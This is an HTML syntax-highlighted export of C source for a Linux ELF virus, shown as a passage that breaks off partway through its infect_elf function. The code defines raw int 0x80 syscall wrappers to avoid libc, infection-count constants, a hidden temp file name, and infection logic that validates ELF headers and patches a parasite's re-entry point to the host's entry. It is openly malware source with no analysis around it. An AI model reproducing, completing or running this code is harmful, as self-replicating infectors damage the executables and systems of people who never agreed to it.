<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc9">#include &lt;linux/types.h&gt;
#include &lt;linux/unistd.h&gt;
#include &lt;linux/dirent.h&gt;
#include &lt;linux/time.h&gt;
#include &lt;linux/fcntl.h&gt;
#include &lt;elf.h&gt;
</span><span class="sc0">
</span><span class="sc1">/* stdio.h has these normally, but where trying avoding libc */</span><span class="sc0">

</span><span class="sc9">#ifdef DEBUG
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">fmt</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">...);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">
</span><span class="sc9">#define SEEK_SET    0
#define SEEK_CUR    1
#define SEEK_END    2
</span><span class="sc0">
</span><span class="sc9">#define PAGE_SIZE   4096
</span><span class="sc0">
</span><span class="sc9">#define PRN_MOD     729
#define PRN_MUL     40
#define PRN_INC     3641
</span><span class="sc0">
</span><span class="sc9">#define PRN_DO(M)   ((PRN_MUL*(M) + PRN_INC) % PRN_MOD);
</span><span class="sc0">
</span><span class="sc9">#define YINFECT     4
#define NINFECT     16
</span><span class="sc0">
</span><span class="sc9">#define TMPFILENAME ".vi434.tmp"
</span><span class="sc0">
</span><span class="sc1">/*
    normally in sys/stat.h (actually statbuf.h) but again, where avoiding
    libc.  the man page shows a different format btw. we use the linux
    one.
*/</span><span class="sc0">

</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">stat</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">dev_t</span><span class="sc0"> </span><span class="sc11">st_dev</span><span class="sc10">;</span><span class="sc0">                     </span><span class="sc1">/* Device.  */</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">short</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__pad1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">ino_t</span><span class="sc0"> </span><span class="sc11">st_ino</span><span class="sc10">;</span><span class="sc0">                     </span><span class="sc1">/* File serial number.  */</span><span class="sc0">
    </span><span class="sc11">mode_t</span><span class="sc0"> </span><span class="sc11">st_mode</span><span class="sc10">;</span><span class="sc0">                   </span><span class="sc1">/* File mode.  */</span><span class="sc0">
    </span><span class="sc11">nlink_t</span><span class="sc0"> </span><span class="sc11">st_nlink</span><span class="sc10">;</span><span class="sc0">                 </span><span class="sc1">/* Link count.  */</span><span class="sc0">
    </span><span class="sc11">uid_t</span><span class="sc0"> </span><span class="sc11">st_uid</span><span class="sc10">;</span><span class="sc0">                     </span><span class="sc1">/* User ID of the file's owner. */</span><span class="sc0">
    </span><span class="sc11">gid_t</span><span class="sc0"> </span><span class="sc11">st_gid</span><span class="sc10">;</span><span class="sc0">                     </span><span class="sc1">/* Group ID of the file's group.*/</span><span class="sc0">
    </span><span class="sc11">dev_t</span><span class="sc0"> </span><span class="sc11">st_rdev</span><span class="sc10">;</span><span class="sc0">                    </span><span class="sc1">/* Device number, if device.  */</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">short</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__pad2</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">off_t</span><span class="sc0"> </span><span class="sc11">st_size</span><span class="sc10">;</span><span class="sc0">                    </span><span class="sc1">/* Size of file, in bytes.  */</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">st_blksize</span><span class="sc10">;</span><span class="sc0">       </span><span class="sc1">/* Optimal block size for I/O.  */</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">st_blocks</span><span class="sc10">;</span><span class="sc0">        </span><span class="sc1">/* Number of 512-byte blocks allocated.
 */</span><span class="sc0">
    </span><span class="sc11">time_t</span><span class="sc0"> </span><span class="sc11">st_atime</span><span class="sc10">;</span><span class="sc0">                  </span><span class="sc1">/* Time of last access.  */</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__unused1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">time_t</span><span class="sc0"> </span><span class="sc11">st_mtime</span><span class="sc10">;</span><span class="sc0">                  </span><span class="sc1">/* Time of last modification.  */</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__unused2</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">time_t</span><span class="sc0"> </span><span class="sc11">st_ctime</span><span class="sc10">;</span><span class="sc0">                  </span><span class="sc1">/* Time of last status change.  */</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__unused3</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__unused4</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__unused5</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc1">/*
    Remember, we cant use libc even for things like open, close etc

    New __syscall macros are made so not to use errno which are just
    modified _syscall routines from asm/unistd.h
*/</span><span class="sc0">

</span><span class="sc9">#define __syscall1(type,name,type1,arg1) \
type name(type1 arg1) \
{ \
long __res; \
__asm__ volatile ("int $0x80" \
    : "=a" (__res) \
    : "0" (__NR_##name),"b" ((long)(arg1))); \
    return (type) __res; \
}
</span><span class="sc0">
</span><span class="sc9">#define __syscall2(type,name,type1,arg1,type2,arg2) \
type name(type1 arg1,type2 arg2) \
{ \
long __res; \
__asm__ volatile ("int $0x80" \
    : "=a" (__res) \
    : "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2))); \
    return (type) __res; \
}
</span><span class="sc0">
</span><span class="sc9">#define __syscall3(type,name,type1,arg1,type2,arg2,type3,arg3) \
type name(type1 arg1,type2 arg2,type3 arg3) \
{ \
long __res; \
__asm__ volatile ("int $0x80" \
    : "=a" (__res) \
    : "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2)), \
        "d" ((long)(arg3))); \
    return (type) __res; \
}
</span><span class="sc0">
</span><span class="sc11">__syscall1</span><span class="sc10">(</span><span class="sc11">time_t</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">time</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">time_t</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc11">t</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">__syscall1</span><span class="sc10">(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">brk</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">brk</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">__syscall2</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fstat</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">stat</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">__syscall1</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">unlink</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc11">pathname</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">__syscall2</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fchmod</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">filedes</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">mode_t</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">mode</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">__syscall3</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fchown</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">uid_t</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">owner</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">gid_t</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">group</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">__syscall2</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rename</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc11">oldpath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc11">newpath</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">__syscall3</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">getdents</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">uint</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">dirent</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc11">dirp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">uint</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">count</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">__syscall3</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">open</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc11">file</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">flag</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">mode</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">__syscall1</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">close</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">__syscall3</span><span class="sc10">(</span><span class="sc11">off_t</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">lseek</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">filedes</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">off_t</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">offset</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">whence</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">__syscall3</span><span class="sc10">(</span><span class="sc11">ssize_t</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">read</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">size_t</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">count</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">__syscall3</span><span class="sc10">(</span><span class="sc11">ssize_t</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">write</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">size_t</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">count</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">copy_partial</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">od</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">idata</span><span class="sc10">[</span><span class="sc11">PAGE_SIZE</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">r</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">PAGE_SIZE</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">idata</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">PAGE_SIZE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">PAGE_SIZE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">od</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">idata</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">PAGE_SIZE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">PAGE_SIZE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">PAGE_SIZE</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">PAGE_SIZE</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc11">r</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">idata</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">r</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">od</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">idata</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">r</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">r</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">error</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">infect_elf</span><span class="sc10">(</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">v</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">vlen</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">vhentry</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">ventry</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">vhoff</span><span class="sc0">
</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">Elf32_Shdr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">shdr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">Elf32_Phdr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">phdr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">Elf32_Ehdr</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">offset</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">oshoff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pos</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">evaddr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">plen</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">slen</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">b</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">brk</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sdata</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pdata</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">retval</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">stat</span><span class="sc0"> </span><span class="sc11">stat</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">od</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#ifndef DEBUG
</span><span class="sc0">    </span><span class="sc16">volatile</span><span class="sc0"> </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">addr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc1">/* use the stack */</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">
</span><span class="sc1">/* read the ehdr */</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">ehdr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">ehdr</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">ehdr</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* ELF checks */</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0">
        </span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_ident</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">ELFMAG0</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_ident</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">ELFMAG1</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_ident</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">ELFMAG2</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_ident</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">ELFMAG3</span><span class="sc0">
    </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_type</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">ET_EXEC</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_type</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">ET_DYN</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_machine</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">EM_386</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_machine</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">EM_486</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_version</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">EV_CURRENT</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* modify the parasite so that it knows the correct re-entry point */</span><span class="sc0">

    </span><span class="sc10">*(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">v</span><span class="sc10">[</span><span class="sc11">vhentry</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_entry</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* allocate memory for tables */</span><span class="sc0">

    </span><span class="sc11">plen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(*</span><span class="sc11">phdr</span><span class="sc10">)*</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_phnum</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">sdata</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">b</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">plen</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">slen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(*</span><span class="sc11">shdr</span><span class="sc10">)*</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_shnum</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">k</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">slen</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">brk</span><span class="sc10">(</span><span class="sc11">k</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">pdata</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">b</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* read the phdr's */</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_phoff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_SET</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">
